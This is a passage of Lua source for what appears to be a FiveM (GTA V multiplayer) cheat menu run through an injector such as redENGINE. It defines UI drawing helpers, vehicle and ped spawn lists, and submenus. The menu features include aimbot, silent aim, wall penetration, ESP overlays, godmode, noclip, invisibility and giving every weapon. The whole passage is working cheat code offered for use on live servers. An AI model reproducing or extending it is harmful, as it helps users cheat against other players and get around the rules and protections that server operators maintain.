                    Winnie_CreateRuntimeTextureFromDuiHandle(Winnie_CreateRuntimeTxd("circlegreen"),"circle", Winnie_GetDuiHandle(ZM_M1000.circlegreen))
                    --Wait(200) -- keyboard end
            end

    function DuiCloseKeyboard()
        Winnie_DestroyDui(ZM_KeyboardUI.circle)
        Winnie_DestroyDui(ZM_KeyboardUI.mov)
        Winnie_DestroyDui(ZM_KeyboardUI.banner)
        Winnie_DestroyDui(ZM_KeyboardUI.arrow)
        Winnie_DestroyDui(ZM_KeyboardUI.circlered)
        Winnie_DestroyDui(ZM_KeyboardUI.circlegreen)
        Winnie_DestroyDui(ZM_KeyboardUI.sepa)
    end

    function DuiCloseMouse()
        Winnie_DestroyDui(ZM_M1000.circle)
        Winnie_DestroyDui(ZM_M1000.mov)
        Winnie_DestroyDui(ZM_M1000.uiinutile)
        Winnie_DestroyDui(ZM_M1000.jesaispas)
        Winnie_DestroyDui(ZM_M1000.bhoejesaispas2)
        Winnie_DestroyDui(ZM_M1000.winniemonbb)
        Winnie_DestroyDui(ZM_M1000.sexexe)
        Winnie_DestroyDui(ZM_M1000.circlered)
        Winnie_DestroyDui(ZM_M1000.circlegreen)
    end


    local function max(get)
        Winnie_SetVehicleFixed(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false))Winnie_SetVehicleDirtLevel(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),0.0)Winnie_SetVehicleLights(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),0)Winnie_SetVehicleBurnout(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),false)CIT.InvokeNative(0x1FD09E7390A74D54,Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),0)Winnie_SetVehicleModKit(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),0)Winnie_SetVehicleWheelType(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),7)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),0,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),0)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),1,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),1)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),2,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),2)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),3,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),3)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),4,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),4)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),5,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),5)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),6,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),6)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),7,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),7)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),8,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),8)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),9,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),9)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),10,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),10)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),11,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),11)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),12,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),12)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),13,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),13)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),14,16,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),15,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),15)-2,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),16,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),16)-1,false)Winnie_ToggleVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),17,true)Winnie_ToggleVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),18,true)Winnie_ToggleVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),19,true)Winnie_ToggleVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),20,true)Winnie_ToggleVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),21,true)Winnie_ToggleVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),22,true)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),23,1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),24,1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),25,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),25)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),27,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),27)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),28,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),28)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),30,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),30)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),33,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),33)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),34,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),34)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),35,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),35)-1,false)Winnie_SetVehicleMod(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),38,GetNumVehicleMods(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),38)-1,true)Winnie_SetVehicleWindowTint(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),1)Winnie_SetVehicleTyresCanBurst(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),false)Winnie_SetVehicleNumberPlateTextIndex(Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(),false),5)
    end

    local ped = {
        {props = "a_c_cat_01", id = "Cat"},
        {props = "a_c_pug", id = "Dog"},
        {props = "a_c_cow", id = "Cow"},
        {props = "a_c_boar", id = "Boar"},
        {props = "a_c_crow", id = "Crow"},
        {props = "a_c_deer", id = "Deer"},
        {props = "a_c_fish", id = "Fish"},
        {props = "a_c_sharktiger", id = "Shark"},
        {props = "a_c_pigeon", id = "Pigeon"},
        {props = "a_c_chimp", id = "Monkey"},
        {props = "a_c_coyote", id = "Coyote"},
    }
    ZM_KeyboardUI.Checkbox = {
        ["includeplayervisual-function"] = true,
        ["spawninside-function"] = true,
        ["scrollbar-function"] = true,
        ["animation-function"] = true,
        ["boxopa-function"] = true
    }
    local vehicle1 = {
        {name = "Kurama2", button = "Kurama Armored"},
        {name = "Raptor", button = "Raptor"},
        {name = "Verlierer2", button = "Verlierer2"},
        {name = "BType", button = "BType"},
        {name = "Mamba", button = "Mamba"},
        {name = "StingerGT", button = "StingerGT"},
        {name = "ZType", button = "ZType"},
        {name = "GP1", button = "GP1"},
        {name = "T20", button = "T20"},
        {name = "Italigtb2", button = "Italigtb2"},
        {name = "Turismo2", button = "Turismo2"},
        {name = "SultanRS", button = "SultanRS"},
        {name = "Voltic", button = "Voltic"},
        {name = "Mesa3", button = "Mesa3"},
        {name = "brioso", button = "Brioso"},
        {name = "Contender", button = "Contender"},
        {name = "Baller2", button = "Baller"},
        {name = "BJXL", button = "BJXL"},
        {name = "Dubsta", button = "Dubsta"},
        {name = "XLS", button = "XLS"},
        {name = "Fugitive", button = "Fugitive"},
        {name = "Primo", button = "Primo"},
        {name = "Taxi", button = "Taxi"},
        {name = "Banshee", button = "Banshee"},
        {name = "BestiaGTS", button = "BestiaGTS"},
        {name = "prairie", button = "Prairie"},
        {name = "Comet3", button = "Comet3"},
        {name = "Kuruma", button = "Kuruma"},
        {name = "Exemplar", button = "Exemplar"},
        {name = "Felon", button = "Felon"},
        {name = "Jackal", button = "Jackal"},
        {name = "Oracle", button = "Oracle"},
        {name = "Sentinel", button = "Sentinel"},
        {name = "Zion", button = "Zion"},
        {name = "Dominator", button = "Dominator"},
        {name = "Dukes2", button = "Dukes2"},
        {name = "Gauntlet", button = "Gauntlet"},
        {name = "Moonbeam", button = "Moonbeam"},
        {name = "SlamVan", button = "SlamVan"},
        {name = "Voodoo", button = "Voodoo"},
        {name = "Ruiner", button = "Ruiner"},
        {name = "BfInjection", button = "BfInjection"},
        {name = "Dune", button = "Dune"},
        {name = "Marshall", button = "Marshall"},
        {name = "Bison", button = "Bison"},
        {name = "BobcatXL", button = "BobcatXL"},
        {name = "Boxville", button = "Boxville"},
        {name = "Burrito", button = "Burrito"},
        {name = "Camper", button = "Camper"},
        {name = "Journey", button = "Journey"},
        {name = "Minivan", button = "Minivan"},
        {name = "Paradise", button = "Paradise"},
        {name = "Speedo", button = "Speedo"},
        {name = "Surfer", button = "Surfer"},
        {name = "Taco", button = "Taco"},
        {name = "Speedo2", button = "Clown Van"},
        {name = "Sadler", button = "Sadler"},
        {name = "Tractor2", button = "Tractor2"},
        {name = "TowTruck", button = "TowTruck"},
        {name = "TowTruck2", button = "TowTruck2"},
    }

    local vehicle2 = {
        {spawn = "2013rs7", name = "Audi Rs7 2013"},
        {spawn = "a8lw12", name = "Audi A8 w12"},
        {spawn = "audi7", name = "Audi A7"},
        {spawn = "cookiers6", name = "Audi Rs6"},
        {spawn = "q7", name = "Audi Q7"},
        {spawn = "q8prior", name = "Audi Q8"},
        {spawn = "r8ppi", name = "Audi R8"},
        {spawn = "rs7c8", name = "Audi Rs7c8"},
        {spawn = "rs52021", name = "Audi Rs5 2021"},
        {spawn = "17m760i", name = "BMW m760"},
        {spawn = "bmci", name = "BMW bmci"},
        {spawn = "bmwe38", name = "BMW e38"},
        {spawn = "bmwm4gts", name = "BMW M4 Gts"},
        {spawn = "m5e60", name = "BMW M5 e60"},
        {spawn = "m6f13", name = "BMW M6 f13"},
        {spawn = "BMWM5PRZEMO", name = "BMW M5"},
        {spawn = "bmwm4custom", name = "BMW M4"},
        {spawn = "rmodmi8lb", name = "[RMOD] BMW i8lb"},
        {spawn = "rmodx6", name = "[RMOD] BMW X6"},
        {spawn = "zl12017", name = "Camaro zl1 2017"},
        {spawn = "giuhellcat", name = "CID Giu Hellcat"},
        {spawn = "taurus", name = "Taurus"},
        {spawn = "16charger", name = "Dodge 16 Charger"},
        {spawn = "ram2500", name = "Dodge Ram 2500"},
        {spawn = "488", name = "Ferrari 488"},
        {spawn = "f8t", name = "Ferrari F8T"},
        {spawn = "f812", name = "Ferrari F812"},
        {spawn = "laferrariprzemo", name = "La Ferrari Przemo"},
        {spawn = "19Raptor", name = "Ford Raptor"},
        {spawn = "velociraptor", name = "Ford Velociraptor"},
        {spawn = "gmcat4", name = "GMC Cat4"},
        {spawn = "gmcs", name = "GMC Sierra"},
        {spawn = "gmcyd", name = "GMC Yukon Denali"},
        {spawn = "sierra2021", name = "GMC Sierra 2021"},
        {spawn = "c7", name = "Chevrolet C7"},
        {spawn = "c8", name = "Chevrolet C8"},
        {spawn = "chevelle1970", name = "Chevrolet Chevelle 1970"},
        {spawn = "chsub01", name = "Chevrolet Suburban"},
        {spawn = "tahoe", name = "Chevrolet Tahoe"},
        {spawn = "jeep2021", name = "Jeep 2021"},
        {spawn = "jeepg", name = "Jeep Grand Cherokee"},
        {spawn = "trhawk", name = "Jeep TRHAWK"},
        {spawn = "gs350", name = "Lexus GS 350"},
        {spawn = "lexy", name = "Lexus Lexy"},
        {spawn = "lfa10", name = "Lexus LFA10"},
        {spawn = "lx2018", name = "Lexus LX 2018"},
        {spawn = "720s18", name = "McLaren 720S"},
        {spawn = "22g63", name = "Mercedes-Benz G63"},
        {spawn = "amggt", name = "Mercedes-Benz AMG GT"},
        {spawn = "b63s", name = "Mercedes-Benz B63S"},
        {spawn = "e63b", name = "Mercedes-Benz E63B"},
        {spawn = "evcs65", name = "Mercedes-Benz EVCS65"},
        {spawn = "gle53", name = "Mercedes-Benz GLE53"},
        {spawn = "gt63s", name = "Mercedes-Benz GT63S"},
        {spawn = "ma45", name = "Mercedes-Benz MA45"},
        {spawn = "mb300sl", name = "Mercedes-Benz MB300SL"},
        {spawn = "rocket", name = "Mercedes-Benz Rocket 900"},
        {spawn = "s600w220", name = "Mercedes-Benz S 600"},
        {spawn = "sl63", name = "Mercedes-Benz SL 63 AMG"},
        {spawn = "xxxxx", name = "Mercedes-Benz Unknown"},
        {spawn = "rmod mustang", name = "[RMOD] Mustang"},
        {spawn = "350z", name = "Nissan 350z"},
        {spawn = "nissantitan17", name = "Nissan Titan"},
        {spawn = "pnismo", name = "Nissan Nismo"},
        {spawn = "rmodskyline", name = "[RMOD] Nissan Skyline"},
        {spawn = "skyline", name = "Nissan Skyline"},
        {spawn = "panamera17turbo", name = "Porsche Panamera 17 Turbo"},
        {spawn = "pts21", name = "Porsche 911 Turbo S"},
        {spawn = "taycan", name = "Porsche Taycan"},
        {spawn = "teslapd", name = "Tesla Police"},
        {spawn = "teslax", name = "Tesla X"},
        {spawn = "rmodsupra", name = "[RMOD] Supra"},
    }


    ZM_KeyboardUI.lerp = function(a, b, t)
        if a > 1 then return t end
        if a < 0 then return b end

        return b + (t - b) * a
    end


    --


    ZM_KeyboardUI.DrawImage = function(id, x, y, width, height)
        redENGINE.DrawImage(id, x/ZM_KeyboardUI.resX, y/ZM_KeyboardUI.resY, width/ZM_KeyboardUI.resX, height/ZM_KeyboardUI.resY)
    end

    ZM_KeyboardUI.Rectangle = function(x,y,w,h,r,g,b,a)
        DrawRect(x/ZM_KeyboardUI.resX, y/ZM_KeyboardUI.resY, w/ZM_KeyboardUI.resX, h/ZM_KeyboardUI.resY, r, g, b, a)
    end

    ZM_KeyboardUI.Sprite = function(dict,tex,x,y,w,h,r,g,b,a)
        DrawSprite(dict,tex,x/ZM_KeyboardUI.resX, y/ZM_KeyboardUI.resY, w/ZM_KeyboardUI.resX, h/ZM_KeyboardUI.resY, 0.0, r, g, b, a)
    end


    local function Diversion(w, x, C, P, Q, g, R, e)
        DrawRect(w + C / 2, x + P / 2, C, P, Q, g, R, e)
    end
    ZM_KeyboardUI.DrawText = function(text,x,y,scale,font,centre, outline)
        if centre then
            SetTextCentre(centre)
        end
        if outline then
            SetTextOutline()
        end
        SetTextScale(scale/ZM_KeyboardUI.resY, scale/ZM_KeyboardUI.resY)
        SetTextFont(font)
        BeginTextCommandDisplayText('STRING')
        AddTextComponentSubstringPlayerName(text)
        EndTextCommandDisplayText(x/ZM_KeyboardUI.resX, y/ZM_KeyboardUI.resY)
    end



    local SliderKeyboard = {
        ['heal'] = {
            value = 200,
            min = 1,
            max = 200
        },
        ["armor"] = {
            value = 0,
            min = 0,
            max = 100
        },
        ["freecamfov"] = {
            value = 30,
            min = 0,
            max = 100
        },
        ["freecamspeed"] = {
            value = 4,
            min = 0,
            max = 10
        },
        ["freecamsensi"] = {
            value = 3,
            min = 0,
            max = 10
        },
        ["delayhealth"] = {
            value = 1000,
            min = 0,
            max = 3000
        },
        ["opacityvalue"] = {
            value = 255,
            min = 0,
            max = 255
        },
        ["noclip-speed"] = {
            value = 5,
            min = 1,
            max = 10
        },
        ["fastrun-speed"] = {
            value = 1.40,
            min = 1.0,
            max = 1.40
        },
        ["fastswim-speed"] = {
            value = 5,
            min = 1,
            max = 10
        },
        ["crosshairr"] = {
            value = 255,
            min = 0,
            max = 255
        },
        ["crosshairg"] = {
            value = 255,
            min = 0,
            max = 255
        },
        ["crosshairb"] = {
            value = 255,
            min = 0,
            max = 255
        },
        ["espdistance"] = {
            value = 1000,
            min = 0,
            max = 3000
        },

        ["espopacity"] = {
            value = 100,
            min = 0,
            max = 255
        },

        ["espr"] = {
            value = 255,
            min = 0,
            max = 255
        },

        ["espg"] = {
            value = 255,
            min = 0,
            max = 255
        },

        ["espb"] = {
            value = 255,
            min = 0,
            max = 255
        },
           ["aimbotfov"] = {
            value = 2,
            min = 0,
            max = 10
        },
        ["ptfxscale"] = {
            value = 100,
            min = 0,
            max = 100
        },
        ["jumpspeed"] = {
            value = 10,
            min = 0,
            max = 100
        },
        ["boostspeed"] = {
            value = 10,
            min = 0,
            max = 100
        },
        ["colorrvehicle"] = {
            value = 10,
            min = 0,
            max = 255
        },
        ["colorgvehicle"] = {
            value = 10,
            min = 0,
            max = 255
        },
        ["colorbvehicle"] = {
            value = 10,
            min = 0,
            max = 255
        },
        ["explodetype"] = {
            value = 51,
            min = 0,
            max = 82
        },
        ["forcelaunch"] = {
            value = 3,
            min = 0,
            max = 6
        },
        ["colormenur"] = {
            value = 0,
            min = 0,
            max = 255
        },
        ["colormenug"] = {
            value = 50,
            min = 0,
            max = 255
        },
        ["colormenub"] = {
            value = 255,
            min = 0,
            max = 255
        },
        ["valuefly"] = {
            value = 20,
            min = 0,
            max = 250
        },
        ["ptfxvalue"] = {
            value = 1 ,
            min = 0,
            max = 100
        },
        ["strafespeed"] = {
            value = 3,
            min = 0,
            max = 10
        }
    }


    ZM_KeyboardUI.SubMenus = {
        ['player_menu'] = {
            options = {

                {text = '[self mode]', type = 'sep'},
                {text = "Heal", type = "slide", index = SliderKeyboard['heal'], func = function()
                    SetEntityHealth(PlayerPedId(), SliderKeyboard['heal'].value)
                end},
                {text = "Armor", type = "slide", index = SliderKeyboard['armor'], func = function()
                    SetPedArmour(PlayerPedId(), SliderKeyboard['armor'].value)
                end},
                {text = "Revive", func = function()
                    local coords = GetEntityCoords(PlayerPedId())
                        NetworkResurrectLocalPlayer(coords, GetEntityHeading(PlayerPedId(), true, false))
                        StopScreenEffect("DeathFailOut")
                end},

                {text = "Suicide", func = function()
                    SetEntityHealth(PlayerPedId(), 0)
                end},
                {text = "Random Outfit", func = function()
                    SetPedRandomComponentVariation(PlayerPedId(), false)
                        SetPedRandomProps(PlayerPedId())
                end},
                {text = "Clear Ped Task", func = function()
                    ClearPedTasksImmediately(PlayerPedId())
                end},
                {text = "Teleport Waypoint", func = function()
                    local waypoint = GetFirstBlipInfoId(8)
                            if not DoesBlipExist(waypoint) then
                                return
                            end
                            while DoesBlipExist(waypoint) do
                                local coords = GetBlipInfoIdCoord(waypoint).xy

                                for height = 1, 1000 do

                                SetPedCoordsKeepVehicle(PlayerPedId(), coords.x, coords.y, height + 0.0)

                                local found, height =GetGroundZFor_3dCoord(coords.x, coords.y, height + 0.0)

                                if found then
                                    SetPedCoordsKeepVehicle(PlayerPedId(), coords.x, coords.y, height + 0.0)
                                    break
                                end
                                Wait(0)
                            end
                        end
                end},


                {text = '[POWER SELF]', type = 'sep'},



                {text = 'Noclip', type = 'toggle', toggle = 'noclip-function'},
                {text = 'Noclip Speed', type = "slide", index = SliderKeyboard['noclip-speed']},


                {text = 'Stamina', type = 'toggle', toggle = 'stamina-function'},
                {text = 'Fast Run', type = 'toggle', toggle = 'fastrun-function'},
                {text = 'Fast Run Speed', type = "slide", index = SliderKeyboard['fastrun-speed']},

                {text = 'Fast Swim', type = 'toggle', toggle = 'fastswim-function'},
                {text = 'Fast Swim Speed', type = "slide", index = SliderKeyboard['fastswim-speed']},

                {text = 'Invisible',type = 'toggle', toggle = 'invisible-function'},
                {text = 'Auto-Health', type = 'toggle', toggle = 'autohealth-function'},
                {text = 'Auto-Health Delay', type = "slide", index = SliderKeyboard['delayhealth']},


                {text = '[BASIC SELF]', type = 'sep'},

                {text = 'Fake Dead',type = 'toggle', toggle = 'fakedead-function'},
                {text = 'Roll Infinity', type = 'toggle', toggle = 'rollinfinity-function'},
                {text = 'Super Jump', type = 'toggle', toggle = 'superjump-function'},
                {text = 'No Collision', type = 'toggle', toggle = 'nocollision-function'},
                {text = 'Opacity Player', type = 'toggle', toggle = 'opacityplayer-function'},
                {text = 'Opacity Value', type = "slide", index = SliderKeyboard['opacityvalue']},

                {text = '[INVINCIBLE]', type = 'sep'},
                {text = 'Godmode', type = 'toggle', toggle = 'godmode-function'},
                {text = 'Fire Proof', type = 'toggle', toggle = 'fireproof-function'},
                {text = 'Water Proof', type = 'toggle', toggle = 'waterproof-function'},
                {text = 'Melee Proof', type = 'toggle', toggle = 'meleeproof-function'},
                {text = 'Bullet Proof', type = 'toggle', toggle = 'bulletproof-function'},
                {text = 'Explosion Proof', type = 'toggle', toggle = 'explosionproof-function'},


                {text = '[camera]', type = 'sep'},
                {text = 'Freecam', type = 'toggle', toggle = 'freecam-function'},
                {text = 'Freecam FOV', type = "slide", index = SliderKeyboard['freecamfov']},
                {text = 'Freecam Speed', type = "slide", index = SliderKeyboard['freecamspeed']},
                {text = 'Freecam Sensibilty', type = "slide", index = SliderKeyboard['freecamsensi']},
                {text = '[MODEL PED]', type = 'sep'},
                {text = 'Models Self', type = 'menubutton', menu = 'models_self'},



            },
            selectedFeature = 2, Anim = 1,scroll = 0, parent = 'Main Menu'
        },
        ['models_self'] = {
            options = {
                {text = '[MODEL PED]', type = 'sep'},

            },
            selectedFeature = 2, Anim = 1,scroll = 0, parent = 'player_menu'
        },
        ['visual_menu'] = {
            options = {

                {text = '[VISUAL ESP]', type = 'sep'},
                {text = 'Boxes ESP',type = 'toggle', toggle = 'boxesp-function'},
                {text = 'Nametags ESP',type = 'toggle', toggle = 'nametag-function'},
                {text = 'Weapon ESP',type = 'toggle', toggle = 'weaponesp-function'},
                {text = 'Skeleton ESP',type = 'toggle', toggle = 'skeleton-function'},
                {text = 'Healbar ESP',type = 'toggle', toggle = 'healthbar-function'},
                {text = 'Armorbar ESP',type = 'toggle', toggle = 'armorbar-function'},


                {text = '[VISION ESP]', type = 'sep'},
                {text = 'Night Vision',type = 'toggle', toggle = 'nightvision-function'},
                {text = 'Thermal Vision',type = 'toggle', toggle = 'thermalvision-function'},
                {text = 'World Color',type = 'toggle', toggle = 'worldcolor-function'},
                {text = 'Clear Night',type = 'toggle', toggle = 'clearnight-function'},
                {text = 'Remove Fog',type = 'toggle', toggle = 'removefog-function'},


                {text = '[OTHER ESP]', type = 'sep'},
                {text = 'Line ESP',type = 'toggle', toggle = 'linesp-function'},
                {text = 'Player Blips',type = 'toggle', toggle = 'playerblips-function'},
                {text = 'Force Radar',type = 'toggle', toggle = 'forceradar-function'},


                {text = '[CROSSHAIR]', type = 'sep'},
                {text = 'Crosshair',type = 'toggle', toggle = 'crosshair-function'},
                {text = 'R', type = 'slide', index = SliderKeyboard['crosshairr']},
                {text = 'G', type = 'slide', index = SliderKeyboard['crosshairg']},
                {text = 'B', type = 'slide', index = SliderKeyboard['crosshairb']},

                {text = '[CONFIG]', type = 'sep'},
                {text = 'Include Player',type = 'toggle', toggle = 'includepedvisual-function'},
                {text = 'Include Self',type = 'toggle', toggle = 'includeself-function'},
                {text = 'ESP Distance', type = 'slide', index = SliderKeyboard['espdistance']},

                {text = '[COLOR ESP]', type = 'sep'},
                {text = 'Boxes Opacity',type = 'toggle', toggle = 'boxopa-function'},
                {text = 'Boxes Opacity', type = 'slide', index = SliderKeyboard['espopacity']},
                {text = 'ESP R', type = 'slide', index = SliderKeyboard['espr']},
                {text = 'ESP G', type = 'slide', index = SliderKeyboard['espg']},
                {text = 'ESP B', type = 'slide', index = SliderKeyboard['espb']},


            },

            selectedFeature = 2, Anim = 1,scroll = 0, parent = 'Main Menu'
        },

        ['weapon_basic'] = {
            options = {
                {text = '[spawn]', type = 'sep'},

            },
            selectedFeature = 2, Anim = 1,scroll = 0, parent = 'weapon_menu'
        },
        ['weapon_menu'] = {
            options = {
                {text = '[Basic]', type = 'sep'},
                {text = 'Weapon Spawnning', type = 'menubutton', menu = 'weapon_basic'},
                {text = "Give ALL", func = function()
                    for k, v in pairs(weapons) do
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(v), 250, false, false)
                    end
                end},
                {text = "Remove All", func = function()
                    RemoveAllPedWeapons(PlayerPedId(), true)
                end},

                {text = "Remove Specific", func = function()
                    local result = KeyboardInput("WEAPON_PISTOL", "WEAPON_", 50)
                    if result then
                        RemoveWeaponFromPed(PlayerPedId(), GetHashKey(string.upper(result)), 250, false, false)
                    end
                end},

                {text = "Give Specific", func = function()
                    local result = KeyboardInput("WEAPON_PISTOL", "WEAPON_", 50)
                    if result then
                        GiveWeaponToPed(PlayerPedId(), GetHashKey(string.upper(result)), 250, false, false)
                    end
                end},

                {text = "Remove Ammo", func = function()
                    local _get = GetSelectedPedWeapon(PlayerPedId())
                    SetPedAmmo(PlayerPedId(), _get, 0)
                end},

                {text = "Max Ammo", func = function()
                    local _get = GetSelectedPedWeapon(PlayerPedId())
                    SetPedAmmo(PlayerPedId(), _get, 254)
                end},

                {text = '[Aimbot]', type = 'sep'},


                {text = 'Aimlock', type = 'toggle', toggle = 'aimlock-function'},
                {text = 'Silent Aim', type = 'toggle', toggle = 'magicbullet-function'},
                {text = 'No Spread', type = 'toggle', toggle = 'nospread-function'},

                {text = '[Others]', type = 'sep'},



                {text = 'Hit Sound', type = 'toggle', toggle = 'hitsound-function'},
                {text = 'Rapid Fire', type = 'toggle', toggle = 'rapidfire-function'},
                {text = 'PTFX Bullet', type = 'toggle', toggle = 'ptfxbullet-function'},
                {text = 'Shoot Teleport', type = 'toggle', toggle = 'shootteleport-function'},
                {text = 'Ammo Ilimited', type = 'toggle', toggle = 'infiniammo-function'},
                {text = 'Anti-Headshot', type = 'toggle', toggle = 'antiheadshot-function'},


                {text = '[Config]', type = 'sep'},
                {text = 'FOV', type = 'toggle', toggle = 'fov-function'},

                {text = 'Fill FOV', type = 'toggle', toggle = 'fillfov-function'},
                {text = 'FOV Scale', type = 'slide', index = SliderKeyboard['aimbotfov']},
                {text = 'Target Ped', type = 'toggle', toggle = 'tgped-function'},
                {text = 'Target Dead', type = 'toggle', toggle = 'tgdead-function'},
                {text = 'Penetrate Wall', type = 'toggle', toggle = 'pwall-function'},
                {text = 'PTFX Scale', type = 'slide', index = SliderKeyboard['ptfxscale']},




            },
            selectedFeature = 2, Anim = 1,scroll = 0, parent = 'Main Menu'
        },
        ['vehicle_menu'] = {
            options = {
                {text = '[Spawn]', type = 'sep'},
                {text = 'List Of Vehicle', type = 'menubutton', menu = 'list_vehicle'},
                {text = 'Addons Vehicles', type = 'menubutton', menu = 'addon_vehicle'},
                {text = '[BASIC]', type = 'sep'},
                {text = "Spawn Vehicle", func = function()
                    CreateThread(function()
                        local result = KeyboardInput("Spawn Vehicle", "", 30)
                            spawn2(result)
                        end)
                end},
                {text = "Repair Vehicle", func = function()
                    if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                        local getVeh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                        Winnie_SetVehicleFixed(getVeh)
                    end
                end},
                {text = "Delete Vehicle", func = function()
                    if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                        local getveh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                        Winnie_DeleteEntity(getveh)
                    end
                end},
                {text = "Change Plate", func = function()
                    if Winnie_IsPedInAnyVehicle(Winnie_PlayerPedId()) then
                        local result = KeyboardInput("Enter new plate", "", 50)
                        local getVeh = Winnie_GetVehiclePedIsIn(Winnie_PlayerPedId(), true)
                        if result then
                            Winnie_SetVehicleNumberPlateText(getVeh, result)
                        end
                    end
                end},





                    {text = '[OTHER]', type = 'sep'},

                    {text = 'Boost',type = 'toggle', toggle = 'boost-function'},
                    {text = 'Boost Speed', type = 'slide', index = SliderKeyboard['boostspeed']},
                    {text = 'Drift',type = 'toggle', toggle = 'drift-function'},
                    {text = 'Nitro',type = 'toggle', toggle = 'nitro-function'},
                    {text = 'Jump',type = 'toggle', toggle = 'jump-function'},
